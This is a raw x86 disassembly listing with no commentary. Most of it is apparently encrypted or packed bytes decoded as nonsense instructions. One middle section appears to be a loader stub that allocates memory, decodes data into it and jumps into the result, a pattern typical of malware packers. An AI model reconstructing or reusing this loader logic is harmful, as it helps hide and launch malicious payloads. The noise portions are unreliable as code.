  4161e9:	dec    ecx
  4161ea:	sbb    DWORD PTR [edi-0x5a9a72de],0xb836ef2
  4161f4:	repnz retf 0x9d0e
  4161f8:	and    al,0x3c
  4161fa:	sbb    esi,DWORD PTR [eax+0x9a3d754]
  416200:	inc    ebp
  416201:	adc    BYTE PTR [edx],dh
  416203:	push   eax
  416204:	mov    cl,0x65
  416206:	pop    ebx
  416207:	dec    edx
  416208:	test   DWORD PTR ds:0x9d716b63,ebx
  41620e:	retf   
  41620f:	or     ebx,ebx
  416211:	mov    al,ds:0x7654142a
  416216:	jmp    0xa4ad4592
  41621b:	jmp    0x5414fea3
  416220:	gs sysexit 
  416223:	inc    ebp
  416224:	stos   DWORD PTR es:[edi],eax
  416225:	gs pop es
  416227:	adc    DWORD PTR [ecx],edi
  416229:	ret    0x43e6
  41622c:	push   esi
  41622d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41622e:	jle    0x4161bb
  416230:	ins    DWORD PTR es:[edi],dx
  416231:	mov    ds:0x6db9313b,al
  416236:	shr    DWORD PTR ds:0x878df5a5,1
  41623c:	stos   DWORD PTR es:[edi],eax
  41623d:	cld    
  41623e:	or     DWORD PTR [ebx],edx
  416240:	fidiv  DWORD PTR [ebx]
  416242:	sbb    cl,BYTE PTR [ebp+0x55]
  416245:	xor    eax,0x9b0b57c5
  41624a:	push   ss
  41624b:	jns    0x416275
  41624d:	inc    edx
  41624e:	pop    ebp
  41624f:	jno    0x4161ed
  416251:	jge    0x416242
  416253:	jns    0x41621c
  416255:	in     eax,0xf4
  416257:	repz add al,BYTE PTR [ebp-0x22]
  41625b:	out    0x76,al
  41625d:	cmp    al,0x70
  41625f:	into   
  416260:	scas   eax,DWORD PTR es:[edi]
  416261:	xchg   edi,eax
  416262:	stos   DWORD PTR es:[edi],eax
  416263:	(bad)  [edx]
  416265:	ret    
  416266:	xchg   ebp,eax
  416267:	jg     0x416265
  416269:	out    0xd1,eax
  41626b:	cmp    eax,0xb33a61a5
  416270:	jge    0x41625d
  416272:	cmp    eax,0x7f1eace5
  416277:	sbb    BYTE PTR [ebp-0x34727f6a],ch
  41627d:	push   ds
  41627e:	jae    0x4162b0
  416280:	mov    al,0xee
  416282:	or     DWORD PTR [ecx-0x33],0xab5db1cd
  416289:	pop    esi
  41628a:	push   0xd0f95a58
  41628f:	add    eax,0x9f25972d
  416294:	shl    DWORD PTR [edx+ebp*2-0x42e89eec],1
  41629b:	aam    0x1
  41629d:	aam    0x29
  41629f:	jmp    0x942bef2c
  4162a4:	push   esi
  4162a5:	adc    BYTE PTR [ecx+0x5912faca],0xbb
  4162ac:	lock xchg ecx,eax
  4162ae:	dec    ebp
  4162af:	mov    edi,0x21428978
  4162b4:	outs   dx,BYTE PTR ds:[esi]
  4162b5:	push   edx
  4162b6:	into   
  4162b7:	fisttp QWORD PTR [edx+0x47af9f4b]
  4162bd:	xor    eax,ebx
  4162bf:	out    dx,al
  4162c0:	or     esp,ebx
  4162c2:	cmp    al,0xc7
  4162c4:	cmp    esp,DWORD PTR [esi-0xf6e9ef3]
  4162ca:	dec    eax
  4162cb:	sbb    bl,ah
  4162cd:	stos   DWORD PTR es:[edi],eax
  4162ce:	and    eax,DWORD PTR [esi+0x52]
  4162d1:	xchg   esp,eax
  4162d2:	sub    al,BYTE PTR [ecx-0x61]
  4162d5:	dec    ebp
  4162d6:	push   ss
  4162d7:	mov    eax,ds:0x8da4d805
  4162dc:	mov    esi,0x1f5e77fd
  4162e1:	daa    
  4162e2:	ficomp DWORD PTR [esi]
  4162e4:	add    esi,0xffffffd4
  4162e7:	rol    BYTE PTR [edx-0x5a],0x67
  4162eb:	in     al,dx
  4162ec:	test   eax,0x6b54e7c5
  4162f1:	fdiv   QWORD PTR [ecx+edi*1+0x48]
  4162f5:	and    dh,BYTE PTR [esi]
  4162f7:	pop    ss
  4162f8:	ret    
  4162f9:	mov    eax,ds:0x1abb79db
  4162fe:	cmovno eax,esp
  416301:	ins    DWORD PTR es:[edi],dx
  416302:	sub    DWORD PTR [ebx],edi
  416304:	iret   
  416305:	fmul   QWORD PTR [edi+0x7bcb1c5]
  41630b:	cmp    al,0xf9
  41630d:	(bad)  
  41630e:	adc    al,0x49
  416310:	sbb    eax,0x2f6cfabe
  416315:	dec    edx
  416316:	je     0x416318
  416318:	int    0x55
  41631a:	cwde   
  41631b:	cld    
  41631c:	inc    ebp
  41631d:	stc    
  41631e:	push   es
  41631f:	pop    esi
  416320:	pop    ebx
  416321:	pop    ebp
  416322:	cmp    al,0xd7
  416324:	add    ecx,esi
  416326:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416327:	mov    esi,0xeba87bfb
  41632c:	xchg   edi,eax
  41632d:	inc    edx
  41632e:	sbb    eax,0x982c0072
  416333:	fcomp  QWORD PTR [ebx-0x49]
  416336:	and    eax,eax
  416338:	mov    dh,bh
  41633a:	icebp  
  41633b:	outs   dx,DWORD PTR ds:[esi]
  41633c:	push   ecx
  41633d:	fwait
  41633e:	dec    esi
  41633f:	ss cs cdq 
  416342:	repz or eax,0x8015f2f6
  416348:	fisttp DWORD PTR [ecx+0x2]
  41634c:	int    0xd7
  41634e:	pushf  
  41634f:	pusha  
  416350:	xchg   ecx,eax
  416351:	push   esp
  416352:	std    
  416353:	ss out 0x9e,eax
  416356:	inc    eax
  416357:	adc    DWORD PTR [ebx],esp
  416359:	mov    esp,0x3e5faff2
  41635e:	(bad)  
  41635f:	fistp  WORD PTR [ebx-0x60]
  416362:	pop    edi
  416363:	jo     0x416353
  416365:	cdq    
  416366:	pop    edi
  416367:	mov    dl,0xe7
  416369:	adc    BYTE PTR [edi],ah
  41636b:	enter  0x591,0xdf
  41636f:	jns    0x4163b3
  416371:	fld    DWORD PTR [edi]
  416373:	sti    
  416374:	jg     0x416368
  416376:	retf   
  416377:	daa    
  416378:	jnp    0x41630b
  41637a:	lock mov bl,0xc0
  41637d:	xchg   DWORD PTR es:[edi],ebx
  416380:	lahf   
  416381:	pop    es
  416382:	jle    0x41633a
  416384:	inc    eax
  416385:	jg     0x4163cb
  416387:	test   eax,0x38fb485d
  41638c:	add    ecx,ecx
  41638e:	dec    ebx
  41638f:	sub    al,0xde
  416391:	call   0x4c197aad
  416396:	push   esp
  416397:	jl     0x4163b1
  416399:	pop    ecx
  41639a:	imul   edx,esi,0xffffffff
  41639d:	sub    ch,BYTE PTR [esi+0x2f1248d1]
  4163a3:	and    BYTE PTR [esi+0x5d],ch
  4163a6:	ret    
  4163a7:	das    
  4163a8:	sub    edi,DWORD PTR [ecx]
  4163aa:	cs jnp 0x4163e7
  4163ad:	ins    DWORD PTR es:[edi],dx
  4163ae:	pop    ss
  4163af:	dec    edi
  4163b0:	push   es
  4163b1:	sbb    esi,DWORD PTR [ecx+0x1a79cd5a]
  4163b7:	sub    esi,DWORD PTR [ebx-0x42]
  4163ba:	mov    bl,0xb1
  4163bc:	jl     0x416421
  4163be:	xchg   esp,eax
  4163bf:	push   ebx
  4163c0:	jae    0x41639b
  4163c2:	sub    al,0x7
  4163c4:	xchg   ecx,eax
  4163c5:	in     eax,0xc0
  4163c7:	and    DWORD PTR ds:0xe2e366f0,edx
  4163cd:	mov    ds:0x973841c0,al
  4163d2:	jno    0x4163a4
  4163d4:	setle  BYTE PTR [ecx+0x7b]
  4163d8:	mov    al,0x32
  4163da:	dec    ebx
  4163db:	or     bh,ch
  4163dd:	mov    ebx,0x47bb882c
  4163e2:	ret    0x73
  4163e5:	cmp    al,0x60
  4163e7:	adc    al,dh
  4163e9:	pop    edx
  4163ea:	mov    ch,0x70
  4163ec:	das    
  4163ed:	push   esp
  4163ee:	mov    bh,0x60
  4163f0:	pop    ecx
  4163f1:	loop   0x4163ec
  4163f3:	sbb    eax,0xe43ef432
  4163f8:	mov    esp,DWORD PTR [ecx-0x44]
  4163fb:	fwait
  4163fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4163fd:	dec    esi
  4163fe:	inc    edx
  4163ff:	xor    DWORD PTR [eax-0x12b410f],ebp
  416405:	stos   BYTE PTR es:[edi],al
  416406:	cmp    esi,eax
  416408:	ds sbb eax,0x2bb31b6c
  41640e:	push   0x20486a49
  416413:	aaa    
  416414:	or     dl,al
  416416:	sbb    al,0x38
  416418:	add    eax,0x41618732
  41641d:	in     al,dx
  41641e:	loop   0x416481
  416420:	xlat   BYTE PTR ds:[ebx]
  416421:	inc    ebx
  416422:	lea    esi,[esi+0xd443467]
  416428:	sbb    edx,ecx
  41642a:	aad    0x0
  41642c:	mov    edi,0xcfa4406
  416431:	iret   
  416432:	loope  0x416409
  416434:	xor    DWORD PTR [ecx+0x13eda2dd],0xffe40e0
  41643e:	mov    ebx,0xb1ae1f30
  416443:	in     eax,dx
  416444:	cmp    ebx,DWORD PTR [eax+eax*4+0x6ac064ee]
  41644b:	dec    ebx
  41644c:	sbb    BYTE PTR [esi-0x62],dh
  41644f:	xchg   BYTE PTR [ebp+0x122f7436],al
  416455:	retf   0x4bdd
  416458:	data16 xor ah,BYTE PTR [ebx-0x3b]
  41645c:	ins    DWORD PTR es:[edi],dx
  41645d:	inc    eax
  41645e:	pushf  
  41645f:	pop    edx
  416460:	jb     0x41649b
  416462:	pop    edx
  416463:	mov    bh,0x9b
  416465:	xor    DWORD PTR [ebp-0x4085ce35],esp
  41646b:	and    DWORD PTR [esi-0x7e153796],esi
  416471:	jg     0x41642a
  416473:	repz leave 
  416475:	scas   eax,DWORD PTR es:[edi]
  416476:	xor    dh,BYTE PTR [eax]
  416478:	clc    
  416479:	xchg   ebp,eax
  41647a:	push   es
  41647b:	add    cl,BYTE PTR [edx]
  41647d:	leave  
  41647e:	jno    0x416403
  416480:	adc    BYTE PTR [ebx],0x3e
  416483:	and    eax,0xd80be687
  416488:	jns    0x416437
  41648a:	(bad)  
  41648b:	adc    DWORD PTR [eax+0x5],esp
  41648e:	pop    ecx
  41648f:	popf   
  416490:	in     eax,0x9e
  416492:	pop    es
  416493:	jae    0x416438
  416495:	call   0x564e:0x16db44ab
  41649c:	loopne 0x416454
  41649e:	dec    edx
  41649f:	mov    ah,BYTE PTR [ebx]
  4164a1:	cld    
  4164a2:	(bad)  
  4164a3:	sub    eax,0xbaa6d0f2
  4164a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164a9:	repnz or DWORD PTR [edi],0xaf032c57
  4164b0:	mov    eax,ds:0x7706336b
  4164b5:	sbb    al,0x69
  4164b7:	out    dx,al
  4164b8:	fbld   TBYTE PTR [eax+0xb97dc60]
  4164be:	jmp    0x4164c5
  4164c0:	cld    
  4164c1:	iret   
  4164c2:	sub    al,0x8
  4164c4:	sub    DWORD PTR [ebx-0x54],eax
  4164c7:	dec    edi
  4164c9:	mov    BYTE PTR [ecx+0x30],0x6a
  4164cd:	loope  0x4164e6
  4164cf:	or     esp,DWORD PTR [edi-0x760c3c3]
  4164d5:	and    BYTE PTR [eax],cl
  4164d7:	les    ebx,FWORD PTR [ebp-0x7f]
  4164da:	sbb    DWORD PTR [edx-0x289bfacb],edx
  4164e0:	dec    ebx
  4164e1:	shr    BYTE PTR [edx+0x55],1
  4164e4:	sar    BYTE PTR [edi+0x2ed4250e],cl
  4164ea:	jno    0x4164ad
  4164ec:	int    0x4
  4164ee:	bound  edi,QWORD PTR [eiz*4+0x585a6719]
  4164f5:	lods   eax,DWORD PTR ds:[esi]
  4164f6:	lea    ebx,[ecx]
  4164f8:	daa    
  4164f9:	mov    cl,0x93
  4164fb:	add    al,BYTE PTR [ecx-0x60]
  4164fe:	rcr    DWORD PTR [ebp-0xe261da8],1
  416504:	mov    ds:0xc6c1d2db,al
  416509:	fmul   DWORD PTR [ebp+0x700e18f3]
  41650f:	xor    dh,bl
  416511:	sti    
  416512:	into   
  416513:	xchg   edi,eax
  416514:	inc    esp
  416515:	addr16 mov ds:0x4609,al
  416519:	adc    ebp,DWORD PTR [ebp+0x18275a2]
  41651f:	cld    
  416520:	add    bl,BYTE PTR [ebx+eax*2]
  416523:	jge    0x4164ed
  416525:	popf   
  416526:	arpl   WORD PTR [eax+0x59543b10],bp
  41652c:	push   ecx
  41652d:	add    BYTE PTR [eax],dl
  41652f:	or     edi,DWORD PTR [ecx+0x64]
  416532:	mov    al,ds:0xdf78bc3c
  416537:	adc    al,0xf2
  416539:	test   eax,0x6cdf7b92
  41653e:	clc    
  41653f:	or     dh,bh
  416541:	pop    ss
  416542:	ins    DWORD PTR es:[edi],dx
  416543:	fsubr  QWORD PTR [ebx-0x59ec4250]
  416549:	pop    edi
  41654a:	fst    st(2)
  41654c:	iret   
  41654d:	leave  
  41654e:	dec    edi
  41654f:	pop    ebx
  416550:	sbb    BYTE PTR [esi-0x1e],cl
  416553:	out    dx,al
  416554:	mov    edx,0x93c76d89
  416559:	(bad)  
  41655a:	call   0x21ff14a6
  41655f:	and    DWORD PTR [eax+0x54],ebp
  416562:	bound  ebp,QWORD PTR [ebp-0x2a]
  416565:	pop    es
  416566:	(bad)  
  416567:	pop    ss
  416568:	mov    al,ds:0x87ba81ca
  41656d:	pop    esi
  41656e:	jne    0x41652d
  416570:	sub    ebp,DWORD PTR [edx-0x1f80859]
  416576:	xchg   ebx,eax
  416577:	jmp    0x4165a3
  416579:	and    DWORD PTR [eax-0x276fd852],esi
  41657f:	jmp    0x80df67dd
  416584:	test   BYTE PTR [edx-0x4cfe9637],ch
  41658a:	iret   
  41658b:	fmul   st,st(6)
  41658d:	mov    edx,0xabc26dec
  416592:	or     BYTE PTR [ebx],cl
  416594:	mov    ebx,0xe2f38609
  416599:	repnz mov edx,0x50d844ae
  41659f:	(bad)  
  4165a0:	or     BYTE PTR [edx-0xaf687],bh
  4165a6:	cwde   
  4165a7:	jb     0x41660c
  4165a9:	mov    al,0x64
  4165ab:	mov    DWORD PTR [edi+0x62],esi
  4165ae:	and    edi,ebp
  4165b0:	push   ecx
  4165b1:	xor    BYTE PTR [edi+0x3],dl
  4165b4:	lods   al,BYTE PTR ds:[esi]
  4165b5:	cmp    eax,0x11245dfd
  4165ba:	jns    0x4165c6
  4165bc:	sub    BYTE PTR cs:[esi],al
  4165bf:	fldcw  WORD PTR ds:0xbd2ea759
  4165c5:	test   BYTE PTR [ebp+0xfa28ab8],cl
  4165cb:	pop    esi
  4165cc:	sti    
  4165cd:	add    BYTE PTR [ebp-0x6b],bl
  4165d0:	inc    ebx
  4165d1:	push   0xffffff8c
  4165d3:	and    cl,al
  4165d5:	retf   
  4165d6:	aam    0x5d
  4165d8:	push   0xe79336d0
  4165dd:	add    DWORD PTR [edx-0x70b9025b],0xb3ed3de1
  4165e7:	xchg   ecx,eax
  4165e8:	mov    al,ds:0x910b1564
  4165ed:	int    0x5e
  4165ef:	mov    WORD PTR [edx],fs
  4165f1:	fwait
  4165f2:	pop    ecx
  4165f3:	sub    al,0xb7
  4165f5:	sbb    cl,BYTE PTR [edx+0x76]
  4165f8:	inc    ebp
  4165f9:	mov    edx,0x22512836
  4165fe:	ror    DWORD PTR [edi+0x7c11f90d],1
  416604:	pop    edx
  416605:	daa    
  416606:	pop    es
  416607:	out    0xda,al
  416609:	dec    ebp
  41660a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41660b:	hlt    
  41660c:	ins    DWORD PTR es:[edi],dx
  41660d:	rcr    esp,1
  41660f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416610:	xor    ebp,DWORD PTR [ebx+edi*8+0x1f16c481]
  416617:	cmp    al,0xea
  416619:	aad    0xfd
  41661b:	and    esi,DWORD PTR [ecx+0x4d2bde66]
  416621:	ret    0xc8a7
  416624:	push   eax
  416625:	daa    
  416626:	sbb    eax,0x3ccbcd68
  41662b:	xor    DWORD PTR [ebx],esp
  41662d:	dec    ecx
  41662e:	into   
  41662f:	xor    al,0xd1
  416631:	out    dx,eax
  416632:	(bad)  
  416633:	out    dx,eax
  416634:	xor    eax,0x723b7420
  416639:	cdq    
  41663a:	(bad)  
  41663b:	daa    
  41663c:	je     0x416691
  41663e:	adc    BYTE PTR [ebx+0x56],bh
  416641:	mov    ebx,0x668333b3
  416646:	dec    esi
  416647:	adc    al,0x67
  416649:	cwde   
  41664a:	inc    ecx
  41664b:	cmp    eax,0xc7ad378c
  416650:	test   al,0x41
  416652:	sbb    edx,ebx
  416654:	gs into 
  416656:	jl     0x41667f
  416658:	mov    eax,0xa7061ea
  41665d:	xchg   bl,dh
  41665f:	sbb    al,0x10
  416661:	adc    DWORD PTR [ebx*1-0x251af64f],ebx
  416668:	ret    
  416669:	jmp    0x30b6cb1f
  41666e:	xchg   ebp,eax
  41666f:	or     ch,BYTE PTR [esi]
  416671:	add    BYTE PTR [ebx+esi*4+0x45],0xad
  416676:	sub    al,0x20
  416678:	(bad)  
  416679:	jns    0x416635
  41667b:	xor    bl,cl
  41667d:	cs (bad) 
  41667f:	jmp    0xf61691df
  416684:	pop    DWORD PTR [ebp-0x35]
  416687:	and    edi,DWORD PTR [ebx]
  416689:	popf   
  41668a:	or     esp,eax
  41668c:	push   ecx
  41668d:	mov    ?,WORD PTR [edi+0x40]
  416690:	sub    DWORD PTR [esi],eax
  416692:	cli    
  416693:	fmul   st,st(4)
  416695:	addr16 jnp 0x4166cd
  416698:	lahf   
  416699:	bound  ecx,QWORD PTR [esi]
  41669b:	cmp    eax,DWORD PTR [ebp+0x5c5ce8f3]
  4166a1:	add    esp,ebx
  4166a3:	mov    ebx,0xf9697b26
  4166a8:	dec    edi
  4166a9:	inc    eax
  4166aa:	inc    esi
  4166ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4166ac:	stos   BYTE PTR es:[edi],al
  4166ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166ae:	push   0x44d36826
  4166b3:	add    BYTE PTR [esp+edi*2+0x57],al
  4166b7:	mov    ds,WORD PTR [ecx+0x30]
  4166ba:	imul   ebp,DWORD PTR [ecx+0x6a],0xfdb7b4f9
  4166c1:	xor    DWORD PTR [eax],eax
  4166c3:	or     DWORD PTR [ebp-0x502377ef],eax
  4166c9:	dec    eax
  4166ca:	pop    ds
  4166cb:	fstp   st(1)
  4166cd:	push   edi
  4166ce:	adc    bl,BYTE PTR [ebx]
  4166d0:	leave  
  4166d1:	lods   eax,DWORD PTR ds:[esi]
  4166d2:	addr16 pop esi
  4166d4:	inc    ecx
  4166d5:	push   0x1b
  4166d7:	and    al,0xc
  4166d9:	mov    ecx,0xde0f5118
  4166de:	fwait
  4166df:	test   BYTE PTR [edi],bl
  4166e1:	xor    al,0x22
  4166e3:	dec    ebx
  4166e4:	ins    DWORD PTR es:[edi],dx
  4166e5:	push   esp
  4166e6:	test   BYTE PTR [ebp*1+0x42ca1773],bl
  4166ed:	popa   
  4166ee:	leave  
  4166ef:	or     BYTE PTR [ebx+0x19],ch
  4166f2:	fs jecxz 0x41673a
  4166f5:	push   0xfffffffe
  4166f7:	jns    0x416707
  4166f9:	mov    ah,0xcd
  4166fb:	fdivp  st(1),st
  4166fd:	sar    DWORD PTR [eax+eax*8],0x6d
  416701:	jns    0x416748
  416703:	test   BYTE PTR [eax-0x261c3866],cl
  416709:	or     al,0x1
  41670b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41670c:	push   ecx
  41670d:	xchg   edx,eax
  41670e:	inc    ebp
  41670f:	cdq    
  416710:	or     BYTE PTR [ebx+0x27],bh
  416713:	adc    eax,0xbb82aadd
  416718:	jnp    0x416778
  41671a:	adc    dl,al
  41671c:	in     eax,0x0
  41671e:	and    DWORD PTR [eax-0xa369869],ecx
  416724:	xor    eax,0x5e265911
  416729:	fnstsw WORD PTR [esi-0x36da6e7d]
  41672f:	and    eax,0x523b2094
  416734:	cmp    bh,BYTE PTR [eax-0x398514ec]
  41673a:	push   esi
  41673b:	fld    TBYTE PTR [eax-0x4071952c]
  416741:	aad    0x4d
  416743:	push   0x7d644ff3
  416748:	add    DWORD PTR [eax-0x5c],edx
  41674b:	sub    al,0x5d
  41674d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41674e:	sar    DWORD PTR [ebx],0x79
  416751:	jecxz  0x416726
  416753:	push   ds
  416754:	je     0x416718
  416756:	aam    0xe9
  416758:	push   ebp
  416759:	(bad)  
  41675a:	aaa    
  41675b:	jmp    0xf682:0x8b11091c
  416762:	out    0x3b,al
  416764:	pop    ecx
  416765:	push   eax
  416766:	or     eax,0xb560d283
  41676b:	jns    0x416795
  41676d:	mov    bh,0x79
  41676f:	xchg   ecx,eax
  416770:	lods   eax,DWORD PTR ds:[esi]
  416771:	cld    
  416772:	add    eax,0x5548d977
  416777:	loope  0x416792
  416779:	(bad)  
  41677a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41677b:	and    al,0x9c
  41677d:	ffreep st(5)
  41677f:	mov    edi,DWORD PTR [edx]
  416781:	std    
  416782:	xchg   edx,eax
  416784:	mov    ch,0x97
  416786:	and    cl,BYTE PTR [ebp-0x3cc8b673]
  41678c:	ins    BYTE PTR es:[edi],dx
  41678d:	mov    al,ds:0x30cf524e
  416792:	fldenv [eax-0x65]
  416795:	and    al,0x72
  416797:	jbe    0x416787
  416799:	add    al,0x58
  41679b:	pop    edi
  41679c:	xor    DWORD PTR [edi],edi
  41679e:	sbb    esp,0xd7712dc2
  4167a4:	leave  
  4167a5:	mov    ds:0x89ff5bf6,eax
  4167aa:	repnz mov ?,WORD PTR [edx-0x607b6374]
  4167b1:	jae    0x41674d
  4167b3:	pop    ds
  4167b4:	and    bh,bh
  4167b6:	adc    eax,0x418014
  4167bb:	mov    DWORD PTR [ebp-0x2c],eax
  4167be:	movzx  eax,WORD PTR [ebp-0x2c]
  4167c2:	cmp    eax,0x539
  4167c7:	jne    0x4167f8
  4167c9:	mov    DWORD PTR [ebp-0x14],0xe0d
  4167d0:	lea    ecx,[ebp-0x28]
  4167d3:	push   ecx
  4167d4:	call   DWORD PTR ds:0x418018
  4167da:	mov    DWORD PTR [ebp-0x60],eax
  4167dd:	mov    DWORD PTR [ebp-0x54],0x3a
  4167e4:	mov    BYTE PTR [ebp-0x34],0x0
  4167e8:	mov    DWORD PTR [ebp-0x8],0x5a1ec236
  4167ef:	mov    DWORD PTR [ebp-0x68],0x10b527
  4167f6:	jmp    0x416806
  4167f8:	mov    BYTE PTR ds:0x430700,0x0
  4167ff:	mov    BYTE PTR ds:0x41a770,0x0
  416806:	push   0x0
  416808:	call   DWORD PTR ds:0x418018
  41680e:	mov    DWORD PTR [ebp-0x2c],eax
  416811:	push   DWORD PTR ds:0x418018
  416817:	pop    edx
  416818:	mov    DWORD PTR [ebp-0x6c],edx
  41681b:	lea    edx,[ebp-0x40]
  41681e:	push   edx
  41681f:	mov    eax,DWORD PTR [ebp-0x60]
  416822:	push   eax
  416823:	call   DWORD PTR ds:0x418024
  416829:	mov    DWORD PTR [ebp-0x44],eax
  41682c:	push   DWORD PTR [ebp-0x30]
  41682f:	push   0x1000
  416834:	mov    eax,DWORD PTR [ebp-0x14]
  416837:	add    eax,0x46
  41683a:	push   eax
  41683b:	push   0x0
  41683d:	mov    ebx,DWORD PTR [ebp-0x44]
  416840:	call   ebx
  416842:	push   eax
  416843:	pop    ebx
  416844:	mov    DWORD PTR [ebp-0x4],ebx
  416847:	mov    ecx,DWORD PTR [ebp-0x68]
  41684a:	sub    ecx,0xdae0b
  416850:	mov    DWORD PTR [ebp-0x68],ecx
  416853:	cmp    DWORD PTR [ebp-0x4],0x0
  416857:	jne    0x416862
  416859:	push   0x0
  41685b:	push   0x0
  41685d:	call   0x417f22
  416862:	mov    edx,DWORD PTR [ebp-0x4]
  416865:	add    edx,DWORD PTR [ebp-0x14]
  416868:	mov    eax,DWORD PTR [ebp-0x8]
  41686b:	mov    DWORD PTR [edx],eax
  41686d:	mov    ecx,DWORD PTR [ebp-0x4]
  416870:	add    ecx,DWORD PTR [ebp-0x54]
  416873:	mov    DWORD PTR [ebp-0x5c],ecx
  416876:	mov    edx,DWORD PTR ds:0x418024
  41687c:	mov    DWORD PTR [ebp-0x4c],edx
  41687f:	mov    eax,DWORD PTR [ebp-0x4]
  416882:	add    eax,DWORD PTR [ebp-0x14]
  416885:	mov    ecx,DWORD PTR [ebp+0x8]
  416888:	mov    DWORD PTR [eax+0x4],ecx
  41688b:	mov    edx,DWORD PTR [ebp-0x4]
  41688e:	add    edx,DWORD PTR [ebp-0x14]
  416891:	mov    DWORD PTR [ebp-0xc],edx
  416894:	cmp    DWORD PTR [ebp-0x68],0x0
  416898:	jbe    0x4168b5
  41689a:	mov    eax,DWORD PTR [ebp-0xc]
  41689d:	push   eax
  41689e:	mov    ecx,DWORD PTR [ebp-0x14]
  4168a1:	push   ecx
  4168a2:	mov    edx,DWORD PTR [ebp-0x2c]
  4168a5:	add    edx,DWORD PTR [ebp-0x68]
  4168a8:	push   edx
  4168a9:	mov    eax,DWORD PTR [ebp-0x4]
  4168ac:	push   eax
  4168ad:	call   0x417e34
  4168b2:	add    esp,0x10
  4168b5:	cmp    DWORD PTR [ebp-0x5c],0x0
  4168b9:	je     0x4168c9
  4168bb:	push   DWORD PTR [ebp-0x4c]
  4168be:	push   DWORD PTR [ebp-0x6c]
  4168c1:	mov    ecx,DWORD PTR [ebp-0x5c]
  4168c4:	push   ecx
  4168c5:	jmp    ecx
  4168c7:	jmp    0x4168cf
  4168c9:	mov    ecx,DWORD PTR [ebp+0x8]
  4168cc:	mov    DWORD PTR [ebp-0x18],ecx
  4168cf:	mov    eax,0x1
  4168d4:	pop    ebx
  4168d5:	mov    esp,ebp
  4168d7:	pop    ebp
  4168d8:	ret    
  4168d9:	push   ebp
  4168da:	mov    ebp,esp
  4168dc:	pop    ebp
  4168dd:	ret    
  4168de:	push   ebp
  4168df:	mov    ebp,esp
  4168e1:	sub    esp,0x54
  4168e4:	mov    DWORD PTR [ebp-0x34],0x0
  4168eb:	mov    DWORD PTR [ebp-0x4],0x0
  4168f2:	mov    DWORD PTR [ebp-0x50],0x0
  4168f9:	mov    DWORD PTR [ebp-0x4c],0x0
  416900:	mov    DWORD PTR [ebp-0x30],0x0
  416907:	lea    eax,[ebp-0x38]
  41690a:	push   eax
  41690b:	push   0x8
  41690d:	call   DWORD PTR ds:0x418020
  416913:	call   DWORD PTR ds:0x418014
  416919:	mov    DWORD PTR [ebp-0x30],eax
  41691c:	lea    ecx,[ebp-0x48]
  41691f:	push   ecx
  416920:	call   DWORD PTR ds:0x418010
  416926:	mov    edx,DWORD PTR [ebp-0x34]
  416929:	push   edx
  41692a:	call   0x416959
  41692f:	add    esp,0x4
  416932:	call   0x417e25
  416937:	mov    DWORD PTR [ebp-0x54],0x0
  41693e:	jmp    0x416949
  416940:	mov    eax,DWORD PTR [ebp-0x54]
  416943:	add    eax,0x1
  416946:	mov    DWORD PTR [ebp-0x54],eax
  416949:	cmp    DWORD PTR [ebp-0x54],0x64
  41694d:	jae    0x416951
  41694f:	jmp    0x416940
  416951:	xor    eax,eax
  416953:	mov    esp,ebp
  416955:	pop    ebp
  416956:	ret    0x10
  416959:	push   ebp
  41695a:	mov    ebp,esp
  41695c:	sub    esp,0x40
  41695f:	push   esi
  416960:	mov    DWORD PTR [ebp-0x40],0x0
  416967:	mov    DWORD PTR [ebp-0x3c],0x0
  41696e:	mov    DWORD PTR [ebp-0x34],0x0
  416975:	mov    DWORD PTR [ebp-0x28],0x0
  41697c:	mov    DWORD PTR [ebp-0x20],0x0
  416983:	mov    DWORD PTR [ebp-0x2c],0x0
  41698a:	mov    DWORD PTR [ebp-0x30],0x449e28
  416991:	mov    DWORD PTR [ebp-0x28],0xa7188876
  416998:	mov    DWORD PTR [ebp-0x38],0x0
  41699f:	mov    eax,DWORD PTR [ebp-0x28]
  4169a2:	mov    DWORD PTR [ebp-0x24],eax
  4169a5:	mov    DWORD PTR [ebp-0x4],0x0
  4169ac:	mov    ecx,DWORD PTR ds:0x418014
  4169b2:	mov    DWORD PTR [ebp-0x4],ecx
  4169b5:	push   0x0
  4169b7:	push   0x4e
  4169b9:	push   0x1e
  4169bb:	push   0x0
  4169bd:	push   0xffffffff
  4169bf:	call   DWORD PTR ds:0x41801c
  4169c5:	test   eax,eax
  4169c7:	je     0x417e04
  4169cd:	js     0x4169d3
  4169cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169d0:	adc    BYTE PTR [eax+0x301a54e9],bl
  4169d6:	mov    al,ds:0xcae25928
  4169db:	pop    esi
  4169dc:	ss test al,0x9b
  4169df:	jmp    0xa0758438
  4169e4:	sub    BYTE PTR [ecx],bl
  4169e6:	sbb    eax,0x10365e35
  4169eb:	fwait
  4169ec:	jmp    0xa0758445
  4169f1:	sub    BYTE PTR [ecx+0x1d],bl
  4169f4:	xor    eax,0x9b10365e
  4169f9:	jmp    0xa0758452
  4169fe:	sub    BYTE PTR [ecx+0x1d],bl
  416a01:	xor    eax,0x9b10365e
  416a06:	jmp    0xa17d845f
  416a0b:	sub    BYTE PTR [ecx+0x13],bl
  416a0e:	sub    ah,ah
  416a10:	cmp    BYTE PTR [eax],dl
  416a12:	das    
  416a13:	loopne 0x4169ae
  416a15:	cmp    ecx,DWORD PTR [ecx+eiz*4+0x613c9464]
  416a1c:	ss pop edi
  416a1e:	arpl   WORD PTR [ebx+0x53752699],di
  416a24:	ror    BYTE PTR [ecx+0x34],cl
  416a27:	cmp    eax,0x7e583f56
  416a2c:	hlt    
  416a2d:	popf   
  416a2e:	je     0x416aa8
  416a30:	push   ecx
  416a31:	sbb    BYTE PTR [edx+0x2c],0x73
  416a35:	adc    eax,0xdf305837
  416a3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
